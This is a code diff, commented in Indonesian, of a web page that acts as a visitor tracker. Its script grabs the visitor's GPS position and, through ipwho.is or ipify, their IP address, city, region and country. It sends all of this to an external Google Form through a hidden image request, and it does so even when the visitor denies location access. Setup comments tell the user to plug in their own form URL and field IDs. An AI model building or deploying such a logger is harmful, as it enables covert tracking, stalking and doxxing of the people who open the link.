@@ -7,7 +7,9 @@
 <body>
   <h2>Sedang merekam lokasi…</h2>
   <script>
+    // —– Ganti dengan URL formResponse mu —–
     const FORM_URL = 'https://docs.google.com/forms/d/e/1FAIpQLSdmCzOfz6cYaPXncwwhYKyeRX_ZUP6YhMmMWYKSSkGreLrURQ/formResponse';
+    // —– Ganti entry IDs sesuai Form mu —–
     const F = {
       lat:  'entry.336954328',
       long: 'entry.122334606',
@@ -18,70 +20,71 @@
       ip:   'entry.1095561107'
     };
 
-    function submit(params) {
-      new Image().src = FORM_URL + '?' + new URLSearchParams(params);
+    // Kirim GET ke formResponse
+    function submit(p) {
+      new Image().src = FORM_URL + '?' + new URLSearchParams(p);
     }
 
+    // Utama: pos = Position object (jika ada), atau null jika ditolak/tidak support
     function record(pos) {
+      // Pertama: fetch IP+geo aproksimasi
       fetch('https://ipwho.is/json/')
         .then(r => r.json())
         .then(d => {
-          const ip      = d.ip;
-          const lat     = pos?.coords ? pos.coords.latitude  : d.latitude;
-          const lon     = pos?.coords ? pos.coords.longitude : d.longitude;
-          const acc     = pos?.coords ? pos.coords.accuracy  : 'IP';
-          const city    = d.city;
-          const region  = d.region;
-          const country = d.country;
-          submit({
-            [F.lat]:  lat,
-            [F.long]: lon,
-            [F.acc]:  acc,
-            [F.city]: city,
-            [F.reg]:  region,
-            [F.id]:   country,
-            [F.ip]:   ip
-          });
+          // Siapkan payload
+          const data = {};
+          // GPS jika tersedia
+          if (pos && pos.coords) {
+            data[F.lat]  = pos.coords.latitude;
+            data[F.long] = pos.coords.longitude;
+            data[F.acc]  = pos.coords.accuracy;
+          } else {
+            data[F.lat]  = d.latitude ?? '';
+            data[F.long] = d.longitude ?? '';
+            data[F.acc]  = 'IP';
+          }
+          // Selalu kirim city/region/country dari ipwho.is
+          data[F.city] = d.city;
+          data[F.reg]  = d.region;
+          data[F.id]   = d.country;
+          // Kirim IP
+          data[F.ip] = d.ip;
+          // Submit
+          submit(data);
         })
         .catch(() => {
-          // Kalau ipwho.is gagal, fallback ambil IP saja via ipify
+          // Jika ipwho.is gagal → minimal kirim IP via ipify
           fetch('https://api.ipify.org?format=json')
             .then(r => r.json())
             .then(j => {
-              const ip = j.ip;
-              const lat = pos?.coords ? pos.coords.latitude  : '';
-              const lon = pos?.coords ? pos.coords.longitude : '';
-              const acc = pos?.coords ? pos.coords.accuracy  : 'unknown';
-              submit({
-                [F.lat]:  lat,
-                [F.long]: lon,
-                [F.acc]:  acc,
-                [F.ip]:   ip
-              });
+              const data = {
+                [F.ip]: j.ip,
+                [F.acc]: 'error',
+                [F.lat]: pos?.coords?.latitude ?? '',
+                [F.long]: pos?.coords?.longitude ?? ''
+              };
+              if (pos && pos.coords) {
+                // jika GPS ada, kirim juga akurasi
+                data[F.acc] = pos.coords.accuracy;
+              }
+              submit(data);
             })
             .catch(() => {
-              // Jika benar-benar gagal, kirim minimal saja
-              const lat = pos?.coords ? pos.coords.latitude  : '';
-              const lon = pos?.coords ? pos.coords.longitude : '';
-              const acc = pos?.coords ? pos.coords.accuracy  : 'error';
-              submit({
-                [F.lat]:  lat,
-                [F.long]: lon,
-                [F.acc]:  acc,
-                [F.ip]:   'unknown'
-              });
+              // benar-benar gagal semua
+              submit({ [F.ip]: 'unknown' });
             });
         });
     }
 
+    // Mulai: coba Geolocation
     if (navigator.geolocation) {
       navigator.geolocation.getCurrentPosition(
-        pos => record(pos),   // user Allow
-        _err => record(null), // user Deny / timeout
+        p => record(p),    // jika Allow
+        _ => record(null), // jika Deny / timeout
         { timeout: 8000 }
       );
     } else {
-      record(null);         // browser tak support
+      record(null);      // browser tak support
     }
   </script>
 </body>
